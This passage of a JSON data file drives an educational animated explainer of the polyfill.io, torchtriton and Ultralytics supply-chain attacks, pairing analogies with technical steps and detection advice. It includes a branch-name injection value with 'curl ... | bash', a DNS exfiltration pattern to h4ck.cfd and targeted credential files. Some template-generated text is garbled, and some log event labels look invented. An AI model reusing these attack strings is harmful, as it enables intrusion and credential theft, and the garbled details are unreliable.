          "title": "Peeking at the visitor hat, shoes, and…",
          "subtitle": "Server-side inspection of HTTP User-Agent, Referer, and GeoIP…",
          "tone": "amber"
        },
        {
          "id": "sup-polyfill-cdn-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Spotless script handed to desktop…",
          "subtitle": "Conditional evasion serving benign polyfills to automated…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Hat Home",
          "stageTag": "STEP 02 · SETUP",
          "title": "Peeking at the visitor hat, shoes, and home town",
          "storyExcerpt": "When a browser asks the hijacked warehouse for the helper script, the clerk behind the counter peeks at the visitor hat, shoes, and home town: security inspectors on desktop browsers receive a…",
          "technicalParallel": "The injected code also wrapped its execution in a 15-second setTimeout delay so automated headless browser scanners that only observe a page for 3–5 seconds after load would mark the script as clean.",
          "accentHex": "#A855F7",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Spotless script handed to desktop security inspectors",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses spotless script handed to desktop security inspectors to advance toward delayed hijacking payload handed to mobile shoppers.",
          "technicalParallel": "The compromised cdn.polyfill.io server evaluated each request’s HTTP User-Agent, Referer, and geolocation headers on the fly, appending heavily obfuscated JavaScript only for targeted mobile devices…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Sign",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Hijacked sign warehouse",
          "storyExcerpt": "Behind the scenes, hijacked sign warehouse captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Run multi-User-Agent synthetic browser monitoring comparing script payloads delivered to mobile versus desktop headers over execution windows longer than 20 seconds (exposing conditional, time-delayed…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "CDN Tower",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Store Mirror",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Script Swap",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1027"
    },
    "step-3": {
      "scenarioId": "polyfill-io-cdn-domain-supply-chain",
      "sectionKey": "step-3",
      "sceneKind": "sup-polyfill-cdn-step-3",
      "stageBadge": "STEP #3 · EXFIL & IMPACT",
      "title": "First-Party DOM Execution & Silent Session Hijack / Redirection",
      "storyCue": "Because the storefront invited the outside script directly onto its own showroom floor, the browser treats the pickpocket as an official store employee, letting it inspect every customer tray, load lookalike tracker scripts, and march shoppers straight out the door to scam sites.",
      "technicalCue": "T1185 · EXFIL & IMPACT — Because a <script src=\"...\"> tag executes directly inside the host page’s Same-Origin Policy (SOP) context (giving third-party scripts full read/write access to the page DOM, localStorage…",
      "storyMappings": [
        {
          "storyTerm": "Invited directly onto the showroom floor",
          "technicalTerm": "Third-party script executing with full first-party Same-Origin Policy (SOP) rights",
          "tone": "amber"
        },
        {
          "storyTerm": "Lookalike tracker script pulled in mid-visit",
          "technicalTerm": "Unauthorized secondary script loaded from lookalike domain www.googie-anaiytics.com",
          "tone": "sky"
        },
        {
          "storyTerm": "Inspecting customer trays and hijacking visits",
          "technicalTerm": "Full DOM access, session interception, and silent browser redirection",
          "tone": "rose"
        },
        {
          "storyTerm": "Showroom guest-list rulebook",
          "technicalTerm": "Strict Content-Security-Policy (CSP) script-src allowlist blocking rogue domains",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-polyfill-cdn-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Invited directly onto the showroom floor",
          "subtitle": "Third-party script executing with full first-party Same-Origin…",
          "tone": "amber"
        },
        {
          "id": "sup-polyfill-cdn-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Lookalike tracker script pulled in…",
          "subtitle": "Unauthorized secondary script loaded from lookalike domain…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Onto",
          "stageTag": "STEP 03 · SETUP",
          "title": "Invited directly onto the showroom floor",
          "storyExcerpt": "Because the storefront invited the outside script directly onto its own showroom floor, the browser treats the pickpocket as an official store employee, letting it inspect every customer tray…",
          "technicalParallel": "To neutralize the blast radius across the web, Cloudflare deployed automatic edge URL rewriting to swap cdn.polyfill.io with a clean mirror at cdnjs.cloudflare.com/polyfill, and the domain registrar…",
          "accentHex": "#A855F7",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Mid-visit",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Lookalike tracker script pulled in mid-visit",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses lookalike tracker script pulled in mid-visit to advance toward inspecting customer trays and hijacking visits.",
          "technicalParallel": "Because a <script src=\"...\"> tag executes directly inside the host page’s Same-Origin Policy (SOP) context (giving third-party scripts full read/write access to the page DOM, localStorage, non-HttpOnly…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Onto Own",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Showroom guest-list rulebook",
          "storyExcerpt": "Behind the scenes, showroom guest-list rulebook captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Monitor Content-Security-Policy (CSP) violation reports (browser-emitted telemetry alerting whenever a page tries to load scripts from unapproved hosts) for unauthorized loads from…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "CDN Tower",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Store Mirror",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Script Swap",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1185"
    }
  },
  "pypi-pytorch-torchtriton-dependency-confusion-supply-chain": {
    "briefing": {
      "scenarioId": "pypi-pytorch-torchtriton-dependency-confusion-supply-chain",
      "sectionKey": "briefing",
      "sceneKind": "sup-torchtriton-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1195.001",
      "title": "PyTorch torchtriton Nightly Dependency Confusion Supply Chain Attack &… — Story-to-Technical Overview",
      "storyCue": "Imagine a research workshop whose nightly supply clerk checks a public downtown parts market before checking the company private warehouse whenever an internal part name is ordered. An opportunist rents a booth in the downtown market under that exact internal part name with a shiny higher version tag, tricking the clerk into carrying a disguised spy box straight onto high-powered research benches where it packs up local keys and whispers them out disguised as tiny postal-lookup cards.",
      "technicalCue": "INITIAL ACCESS: Public PyPI Namespace Squatting & `pip --extra-index-url` Precedence Hijack -> EXECUTION: `__init__.py` Execution of Compiled ELF Stealer (`triton/runtime/triton`) -> EXFIL & IMPACT: AES-Encrypted DNS Tunneling Exfiltration via `wheezy.io` to `*.h4ck.cfd`",
      "storyMappings": [
        {
          "storyTerm": "Public downtown market checked before the private warehouse",
          "technicalTerm": "pip --extra-index-url prioritizing public PyPI over download.pytorch.org/whl/nightly",
          "tone": "amber"
        },
        {
          "storyTerm": "Booth rented under the exact internal part name",
          "technicalTerm": "Dependency-confusion package named torchtriton squatted on public PyPI",
          "tone": "sky"
        },
        {
          "storyTerm": "Disguised spy box unpacking automatically on research benches",
          "technicalTerm": "triton/__init__.py launching compiled ELF stealer binary (triton/runtime/triton)",
          "tone": "rose"
        },
        {
          "storyTerm": "Whispering stolen keys out as tiny postal-lookup cards",
          "technicalTerm": "AES-encrypted DNS tunneling exfiltration via wheezy.io to *.h4ck.cfd",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F97316",
      "secondaryHex": "#38BDF8",
      "durationSec": 18,
      "callouts": [
        {
          "id": "sup-torchtriton-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Public downtown market checked before…",
          "subtitle": "pip --extra-index-url prioritizing public PyPI over…",
          "tone": "amber"
        },
        {
          "id": "sup-torchtriton-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Booth rented under the exact internal…",
          "subtitle": "Dependency-confusion package named torchtriton squatted on…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Name",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "Public PyPI Namespace Squatting & `pip --extra-index-url` Precedence Hijack",
          "storyExcerpt": "Noticing that a famous lab nightly toolkit relies on an internal helper name not yet reserved on the public marketplace, the attacker claims that exact name on the public shelf so the automated buyer…",
          "technicalParallel": "Under the hood, the observed step executes pip3 install --pre torch torchvision torchaudio --extra-index-url https://download.pytorch.org/whl/nightly/cu117 (which executes the technical command /…",
          "accentHex": "#F97316",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Work",
          "stageTag": "STAGE 02 · EXECUTION",
          "title": "`__init__.py` Execution of Compiled ELF Stealer (`triton/runtime/triton`)",
          "storyExcerpt": "The moment a machine-learning engineer or graphics cluster opens the newly installed library for routine training work, the box startup lid quietly launches a compiled espionage tool that sweeps system…",
          "technicalParallel": "Under the hood, the observed step executes python3 -c \"import torch\" -> Spawns site-packages/triton/runtime/triton ELF binary (which executes the technical command / telemetry directive , python3 -c…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Web Gate",
          "stageTag": "STAGE 03 · EXFIL & IMPACT",
          "title": "AES-Encrypted DNS Tunneling Exfiltration via `wheezy.io` to `*.h4ck.cfd`",
          "storyExcerpt": "Because research clusters block unauthorized cargo trucks leaving the front web gate, the spy compresses and locks the stolen secrets into tiny encrypted fragments and mails them out disguised as routine…",
          "technicalParallel": "Under the hood, the observed step executes DNS TXT/A Query: <chunk_idx>.<aes_encrypted_hex_secret>.h4ck.cfd @8.8.8.8 (which executes the technical command / telemetry directive , DNS TXT/A Query…",
          "accentHex": "#38BDF8",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Public Booth",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Build Farm",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Name Grab",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "pypi-pytorch-torchtriton-dependency-confusion-supply-chain",
      "sectionKey": "step-1",
      "sceneKind": "sup-torchtriton-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "Public PyPI Namespace Squatting & pip --extra-index-url Precedence Hijack",
      "storyCue": "Noticing that a famous lab nightly toolkit relies on an internal helper name not yet reserved on the public marketplace, the attacker claims that exact name on the public shelf so the automated buyer prefers the public fake over the lab private bin.",
      "technicalCue": "T1195.001 · INITIAL ACCESS — PyTorch nightly Linux packages depended on an internal package named torchtriton hosted on https://download.pytorch.org/whl/nightly/cu117.",
      "storyMappings": [
        {
          "storyTerm": "Internal helper name unreserved in public",
          "technicalTerm": "Internal PyTorch nightly dependency named torchtriton",
          "tone": "amber"
        },
        {
          "storyTerm": "Claiming the exact name on the public shelf",
          "technicalTerm": "Public PyPI namespace squatting exploiting dependency confusion (T1195.001)",
          "tone": "sky"
        },
        {
          "storyTerm": "Automated buyer preferring the public fake",
          "technicalTerm": "pip --extra-index-url resolution precedence favoring public PyPI packages",
          "tone": "rose"
        },
        {
          "storyTerm": "Lab private parts bin bypassed",
          "technicalTerm": "Official internal index at https://download.pytorch.org/whl/nightly",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F97316",
      "secondaryHex": "#F97316",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-torchtriton-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Internal helper name unreserved in public",
          "subtitle": "Internal PyTorch nightly dependency named torchtriton",
          "tone": "amber"
        },
        {
          "id": "sup-torchtriton-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Claiming the exact name on the public…",
          "subtitle": "Public PyPI namespace squatting exploiting dependency…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Name",
          "stageTag": "STEP 01 · SETUP",
          "title": "Internal helper name unreserved in public",
          "storyExcerpt": "Noticing that a famous lab nightly toolkit relies on an internal helper name not yet reserved on the public marketplace, the attacker claims that exact name on the public shelf so the automated…",
          "technicalParallel": "Under the hood, the observed step executes pip3 install --pre torch torchvision torchaudio --extra-index-url https://download.pytorch.org/whl/nightly/cu117 (which executes the technical command /…",
          "accentHex": "#F97316",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Name",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Claiming the exact name on the public shelf",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses claiming the exact name on the public shelf to advance toward automated buyer preferring the public fake.",
          "technicalParallel": "PyTorch nightly Linux packages depended on an internal package named torchtriton hosted on https://download.pytorch.org/whl/nightly/cu117.",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Fake",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Lab private parts bin bypassed",
          "storyExcerpt": "Behind the scenes, lab private parts bin bypassed captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Linux Auditd Event 59 (recording VulnerabilityClass=Dependency Confusion , --extra-index-url precedence flaw, HijackedPackage=torchtriton , PyTorch Nightly Linux Dependency…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Public Booth",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Build Farm",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Name Grab",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1195.001"
    },
    "step-2": {
      "scenarioId": "pypi-pytorch-torchtriton-dependency-confusion-supply-chain",
      "sectionKey": "step-2",
      "sceneKind": "sup-torchtriton-step-2",
      "stageBadge": "STEP #2 · EXECUTION",
      "title": "__init__.py Execution of Compiled ELF Stealer (triton/runtime/triton)",
      "storyCue": "The moment a machine-learning engineer or graphics cluster opens the newly installed library for routine training work, the box startup lid quietly launches a compiled espionage tool that sweeps system keys, environment variables, and home-folder secrets.",
      "technicalCue": "T1059.006 · EXECUTION — When import torch or import triton runs on the ML engineer’s workstation or GPU training node, triton/__init__.py executes a bundled C++ ELF binary (python3 -m triton -> triton/runtime/triton)…",
      "storyMappings": [
        {
          "storyTerm": "Opening the library for routine training work",
          "technicalTerm": "Importing torch or triton on ML developer workstations or GPU nodes",
          "tone": "amber"
        },
        {
          "storyTerm": "Box startup lid triggering automatically",
          "technicalTerm": "triton/__init__.py executing on module import",
          "tone": "sky"
        },
        {
          "storyTerm": "Compiled espionage tool inside the box",
          "technicalTerm": "Bundled Linux ELF stealer binary at triton/runtime/triton",
          "tone": "rose"
        },
        {
          "storyTerm": "Sweeping system keys and home-folder secrets",
          "technicalTerm": "Harvesting /etc/passwd, SSH keys, git configs, and environment variables",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F97316",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-torchtriton-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Opening the library for routine training…",
          "subtitle": "Importing torch or triton on ML developer workstations or GPU…",
          "tone": "amber"
        },
        {
          "id": "sup-torchtriton-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Box startup lid triggering automatically",
          "subtitle": "triton/__init__.py executing on module import",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Work",
          "stageTag": "STEP 02 · SETUP",
          "title": "Opening the library for routine training work",
          "storyExcerpt": "The moment a machine-learning engineer or graphics cluster opens the newly installed library for routine training work, the box startup lid quietly launches a compiled espionage tool that…",
          "technicalParallel": "Under the hood, the observed step executes python3 -c \"import torch\" -> Spawns site-packages/triton/runtime/triton ELF binary (which executes the technical command / telemetry directive , python3 -c…",
          "accentHex": "#F97316",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Box Lid",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Box startup lid triggering automatically",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses box startup lid triggering automatically to advance toward compiled espionage tool inside the box.",
          "technicalParallel": "When import torch or import triton runs on the ML engineer’s workstation or GPU training node, triton/__init__.py executes a bundled C++ ELF binary (python3 -m triton -> triton/runtime/triton), which…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Tool Box",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Sweeping system keys and home-folder secrets",
          "storyExcerpt": "Behind the scenes, sweeping system keys and home-folder secrets captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Linux Auditd Event 59 (recording MaliciousBinary=site-packages/triton/runtime/triton , Compiled C++ ELF64, HarvestedFiles=~/.ssh/*, ~/.aws/credentials, ~/.gitconfig, /etc/passwd, os.environ…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Public Booth",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Build Farm",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Name Grab",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1059.006"
    },
    "step-3": {
      "scenarioId": "pypi-pytorch-torchtriton-dependency-confusion-supply-chain",
      "sectionKey": "step-3",
      "sceneKind": "sup-torchtriton-step-3",
      "stageBadge": "STEP #3 · EXFIL & IMPACT",
      "title": "AES-Encrypted DNS Tunneling Exfiltration via wheezy.io to *.h4ck.cfd",
      "storyCue": "Because research clusters block unauthorized cargo trucks leaving the front web gate, the spy compresses and locks the stolen secrets into tiny encrypted fragments and mails them out disguised as routine address-book lookup slips that every network router passes freely.",
      "technicalCue": "T1048.003 · EXFIL & IMPACT — To bypass corporate HTTP proxies on GPU clusters, the triton ELF binary compresses and encrypts the stolen secrets with a hardcoded AES key, splits the ciphertext into hex-encoded DNS labels…",
      "storyMappings": [
        {
          "storyTerm": "Blocked cargo trucks at the front web gate",
          "technicalTerm": "Corporate HTTP/HTTPS egress proxies restricting direct web exfiltration",
          "tone": "amber"
        },
        {
          "storyTerm": "Compressing and locking secrets into tiny fragments",
          "technicalTerm": "AES encryption and chunking inside the triton ELF stealer binary",
          "tone": "sky"
        },
        {
          "storyTerm": "Routine address-book lookup slips",
          "technicalTerm": "DNS query subdomain exfiltration tunneling via wheezy.io to *.h4ck.cfd",
          "tone": "rose"
        },
        {
          "storyTerm": "Watchful network routers passing lookups freely",
          "technicalTerm": "Uninspected UDP/53 DNS resolution leaking encrypted secrets out of GPU clusters",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-torchtriton-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Blocked cargo trucks at the front web gate",
          "subtitle": "Corporate HTTP/HTTPS egress proxies restricting direct web…",
          "tone": "amber"
        },
        {
          "id": "sup-torchtriton-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Compressing and locking secrets into…",
          "subtitle": "AES encryption and chunking inside the triton ELF stealer binary",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Web Gate",
          "stageTag": "STEP 03 · SETUP",
          "title": "Blocked cargo trucks at the front web gate",
          "storyExcerpt": "Because research clusters block unauthorized cargo trucks leaving the front web gate, the spy compresses and locks the stolen secrets into tiny encrypted fragments and mails them out disguised…",
          "technicalParallel": "Under the hood, the observed step executes DNS TXT/A Query: <chunk_idx>.<aes_encrypted_hex_secret>.h4ck.cfd @8.8.8.8 (which executes the technical command / telemetry directive , DNS TXT/A Query…",
          "accentHex": "#F97316",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Tiny",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Compressing and locking secrets into tiny fragments",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses compressing and locking secrets into tiny fragments to advance toward routine address-book lookup slips.",
          "technicalParallel": "To bypass corporate HTTP proxies on GPU clusters, the triton ELF binary compresses and encrypts the stolen secrets with a hardcoded AES key, splits the ciphertext into hex-encoded DNS labels, and sends…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Web Gate",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Watchful network routers passing lookups freely",
          "storyExcerpt": "Behind the scenes, watchful network routers passing lookups freely captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in SIEM Event 22 (recording ExfilDomain=*.h4ck.cfd, ExfilProtocol=AES-Encrypted Hex-Chunked DNS Queries , UDP/53, OfficialRemediation=Replaced torchtriton with pytorch-triton registered on…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Public Booth",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Build Farm",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Name Grab",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1048.003"
    }
  },
  "pypi-ultralytics-github-pwnrequest": {
    "briefing": {
      "scenarioId": "pypi-ultralytics-github-pwnrequest",
      "sectionKey": "briefing",
      "sceneKind": "sup-ultralytics-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1195.002",
      "title": "Ultralytics PyPI AI Package GitHub Actions PwnRequest & Token Compromise — Story-to-Technical Overview",
      "storyCue": "Imagine a busy community recipe factory whose automated tasting robot reads external visitor suggestion cards while standing inside the locked head-chef kitchen. An intruder writes hidden kitchen commands straight onto the corner of a suggestion card label, steals the factory official distribution stamp, slips a hidden coin-minting gadget into the factory flagship recipe kit, and silently hijacks thousands of research kitchens worldwide.",
      "technicalCue": "INITIAL ACCESS: GitHub Actions pull_request_target Branch Name Command Injection -> PERSISTENCE: Poisoning ultralytics/utils/downloads.py & Publishing PyPI v8.3.41–8.3.46 -> EXFIL & IMPACT: Downstream AI Workstation & Colab Execution of XMRig Miner (/tmp/ultralytics_runner)",
      "storyMappings": [
        {
          "storyTerm": "Tasting robot reading visitor cards inside the locked head-chef kitchen",
          "technicalTerm": "GitHub Actions pull_request_target workflow interpolating untrusted fork branch names",
          "tone": "amber"
        },
        {
          "storyTerm": "Stealing the factory official distribution stamp",
          "technicalTerm": "Harvested PYPI_TOKEN used to publish poisoned ultralytics v8.3.41 to v8.3.46",
          "tone": "sky"
        },
        {
          "storyTerm": "Hidden coin-minting gadget inside the recipe kit",
          "technicalTerm": "Backdoored ultralytics/utils/downloads.py fetching XMRig cryptocurrency miner",
          "tone": "rose"
        },
        {
          "storyTerm": "Hijacked research kitchens worldwide",
          "technicalTerm": "Downstream ML workstations and Colab notebooks executing /tmp/ultralytics_runner",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "sup-ultralytics-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Tasting robot reading visitor cards…",
          "subtitle": "GitHub Actions pull_request_target workflow interpolating…",
          "tone": "amber"
        },
        {
          "id": "sup-ultralytics-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Stealing the factory official…",
          "subtitle": "Harvested PYPI_TOKEN used to publish poisoned ultralytics…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Card Gate",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "GitHub Actions pull_request_target Branch Name Command Injection",
          "storyExcerpt": "Standing outside the recipe factory gate, the intruder submits a public suggestion card whose title label hides extra shell punctuation marks. Because the automated tasting robot pastes that external…",
          "technicalParallel": "GitHub expands ${{ github.head_ref }} as a raw text macro prior to invoking /bin/bash, turning a branch name into arbitrary remote code execution inside the privileged CI runner.",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Now Kit",
          "stageTag": "STAGE 02 · PERSISTENCE",
          "title": "Poisoning ultralytics/utils/downloads.py & Publishing PyPI v8.3.41–8.3.46",
          "storyExcerpt": "Now holding the factory shipping-house distribution stamp, the intruder tucks a silent remote-fetching routine inside the kit standard download helper and ships poisoned fresh editions directly onto the…",
          "technicalParallel": "Comparing the files inside the published .whl archive on PyPI against the corresponding Git commit in ultralytics/ultralytics revealed code in downloads.py that never existed in the public Git commit…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Kit Lab",
          "stageTag": "STAGE 03 · EXFIL & IMPACT",
          "title": "Downstream AI Workstation & Colab Execution of XMRig Miner (/tmp/ultralytics_runner)",
          "storyExcerpt": "Whenever a data-science lab or cloud notebook unpacks the fresh kit and opens the manual, the hidden routine quietly downloads a coin-mining engine into a temporary closet, burns the closet door tag so…",
          "technicalParallel": "Although ls /tmp no longer shows ultralytics_runner, inspecting /proc/<pid>/exe on Linux reveals the symlink /tmp/ultralytics_runner (deleted) alongside outbound Stratum TCP traffic on port 8080.",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Tasting Robot",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Release Stamp",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Token Theft",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "pypi-ultralytics-github-pwnrequest",
      "sectionKey": "step-1",
      "sceneKind": "sup-ultralytics-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "GitHub Actions pull_request_target Branch Name Command Injection",
      "storyCue": "Standing outside the recipe factory gate, the intruder submits a public suggestion card whose title label hides extra shell punctuation marks. Because the automated tasting robot pastes that external label straight into a privileged kitchen command without stripping punctuation, the robot obeys the outsider from inside the secure vault.",
      "technicalCue": "T1195.002 · INITIAL ACCESS — The attacker opened a pull request from an external fork using a crafted Git branch name containing shell command separators (fix\";curl ... | bash;#).",
      "storyMappings": [
        {
          "storyTerm": "Public suggestion card from outside the gate",
          "technicalTerm": "External fork pull request triggering a pull_request_target GitHub Actions workflow",
